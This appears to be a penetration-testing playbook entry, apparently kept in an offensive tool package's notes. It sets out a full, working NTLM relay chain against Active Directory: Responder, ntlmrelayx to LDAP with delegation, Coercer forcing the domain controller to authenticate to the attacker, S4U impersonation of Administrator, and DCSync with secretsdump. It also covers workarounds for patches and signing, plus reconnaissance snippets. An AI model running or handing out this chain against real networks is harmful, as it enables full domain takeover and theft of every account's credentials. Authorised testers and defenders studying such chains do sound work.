# [2026-04] NTLM Relay + Coercer → Domain Admin Privileges (Without a Password)

## Scenario Classification
Penetration Testing / Internal Network / AD Attack

## Goal Overview
With an internal network foothold but no credentials, obtain domain admin privileges through an NTLM Relay attack chain.

## Complete Execution Chain

1. After gaining internal access, start Responder and disable SMB/HTTP.
   ```bash
   # Edit /etc/responder/Responder.conf
   # SMB = Off, HTTP = Off
   responder -I eth0 -v
   ```

2. Start ntlmrelayx relaying to LDAP (for the AD CS attack).
   ```bash
   ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access
   ```

3. Use Coercer to force the DC to authenticate to us.
   ```bash
   coercer coerce -u '' -p '' -d domain.local \
     -l attacker_ip -t dc01.domain.local --always-continue
   ```

4. The DC's machine account NTLM authentication is relayed to LDAP.
5. ntlmrelayx automatically creates a machine account and configures constrained delegation.
6. Use S4U2Self + S4U2Proxy to impersonate a domain admin.
   ```bash
   getST.py -spn cifs/dc01.domain.local \
     -impersonate Administrator \
     domain.local/CREATED_MACHINE\$:'password' -dc-ip 10.0.0.1
   ```

7. Use the ticket for DCSync.
   ```bash
   export KRB5CCNAME=Administrator.ccache
   secretsdump.py -k -no-pass dc01.domain.local
   ```

## Pitfalls

| Issue | Cause | Solution | Time Spent |
|------|------|---------|------|
| Coercer cannot trigger authentication | Target DC is patched to disable PetitPotam | Switch to PrinterBug (MS-RPRN) | 30min |
| ntlmrelayx reports LDAP signing required | DC has LDAP signing enabled | Change to relaying to LDAPS (636) or HTTP AD CS | 20min |
| Created machine account cannot perform S4U | Domain policy limits the number of machine accounts that can be created | Use an existing low-privileged domain user account instead | 15min |

## Toolchain Findings
- Coercer is more convenient than manually invoking PetitPotam; it automatically tries multiple protocols.
- The `--delegate-access` flag in ntlmrelayx is key; it automatically completes the delegation configuration.
- If LDAP signing is enabled, you can relay to the AD CS HTTP endpoint instead (ESC8).

## Key Code/Commands

```bash
# Full attack chain, one-stop (requires 3 terminals)
# Terminal 1: Responder
responder -I eth0 -v

# Terminal 2: ntlmrelayx
ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access --escalate-user attacker

# Terminal 3: Coercer
coercer coerce -u '' -p '' -d domain.local -l attacker_ip -t dc01.domain.local
```

## Reusable Patterns/Script Snippets

```bash
# Quickly test NTLM Relay feasibility
# 1. Check SMB signing
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# 2. Check LDAP signing
crackmapexec ldap dc01.domain.local -u '' -p '' -M ldap-checker

# 3. Check triggerable protocols
coercer scan -u user -p pass -d domain.local -t dc01.domain.local
```

## Suggestions for This Package
- Coercer and Responder are already in the routing and bootstrap ✓
- ntlmrelayx is part of the impacket suite and preinstalled on Kali ✓

## Evolution Actions
- [x] No update needed (already covered)

## Environment Information
- Kali 2026.1, impacket 0.12.0, coercer 2.4.3
- Target: Windows Server 2022 DC, domain functional level 2016
- Prerequisite: An internal network foothold already exists (obtained via a VPN vulnerability)
